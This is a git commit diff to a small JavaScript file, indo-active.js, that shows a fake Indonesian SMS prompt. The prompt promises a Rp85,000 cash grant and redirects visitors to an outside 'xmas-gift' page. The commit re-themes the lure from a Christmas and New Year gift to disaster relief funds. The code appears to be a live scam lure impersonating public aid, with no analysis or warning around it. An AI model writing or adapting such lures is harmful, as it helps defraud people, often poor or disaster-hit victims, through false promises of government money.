15cb4cce8fda391063867bbfccd7c4a42304bfe1
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-18 09:21:56 +0100

    Update indo-active.js

--- indo-active.js
+++ indo-active.js
@@ -1,5 +1,5 @@
 var password = 'TARIK Rp85.000'
-password=prompt('SMS: Selamat, Anda termasuk di antara warga Indonesia terpilih yang menerima hibah Natal dan Tahun Baru sebesar Rp85.000. Tekan OK untuk menarik uang tunai sekarang. ','TARIK Rp85.000');
+password=prompt('SMS: Selamat, Anda termasuk di antara warga Indonesia terpilih yang menerima Dana Bantuan Bencana sebesar Rp. 85.000. Tekan OK untuk menarik uang tunai sekarang.. ','TARIK Rp85.000');
 if (password != 'TARIK Rp85.000') {
 location.href='https://lhegit.org/xmas-gift.html';
 }
